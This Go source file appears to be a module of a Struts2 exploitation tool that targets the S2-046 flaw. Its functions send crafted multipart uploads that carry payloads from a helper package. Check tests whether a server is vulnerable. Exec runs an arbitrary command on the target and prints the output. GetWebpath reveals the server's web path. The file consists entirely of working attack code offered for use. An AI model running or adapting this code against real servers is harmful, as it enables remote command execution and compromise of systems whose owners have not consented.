package s046

import (
	"ST2G/cvemod/x51utils"
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"strings"
)

func Check(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", x51utils.POC_s046_check)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	_ = writer.WriteField("", "")
	writer.Close()

	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	isVulable := strings.Contains(respBody, x51utils.Checkflag)
	if isVulable {
		x51utils.Colorlog("Found Struts2-046!")

	} else {
		fmt.Println("Struts2-046 Not Vulnerable.")
	}

}

func Exec(url string, command string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", x51utils.POC_s046_exec(command))
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	_ = writer.WriteField("", "")
	writer.Close()
	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println(respBody)
}

func GetWebpath(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", x51utils.POC_s046_webpath)
	if err != nil {
		//panic(err)

	}
	_ = writer.WriteField("", "")
	writer.Close()

	r, _ := http.NewRequest("POST", url, body)
	r.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, _ := client.Do(r)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println("WebPath：", respBody)
}
